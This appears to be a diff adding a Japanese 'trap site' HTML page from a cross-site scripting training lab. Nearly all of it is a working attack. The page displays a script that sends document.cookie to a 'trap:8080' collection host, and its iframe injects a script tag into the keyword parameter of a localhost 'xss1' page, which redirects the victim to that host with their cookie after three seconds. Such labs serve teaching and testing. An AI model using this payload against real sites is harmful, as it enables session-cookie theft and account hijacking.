@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>罠サイト</title>
+</head>
+<body style="background-color: black; color: white;">
+    <h1>罠サイト</h1>
+    <div>
+        ↓このスクリプトを攻撃対象サイトへInjectionしています
+    </div>
+    <div>
+        window.location='http://trap:8080/trap/getCookie?sid='+document.cookie;
+    </div>
+    <iframe width="512" height="256"
+            src="http://localhost:8080/xss1?keyword=<script>window.setTimeout(function(){window.location='http://trap:8080/trap/xss1GetCookie?sid='%2Bdocument.cookie},3000);</script>">
+    </iframe>
+</body>
+</html>
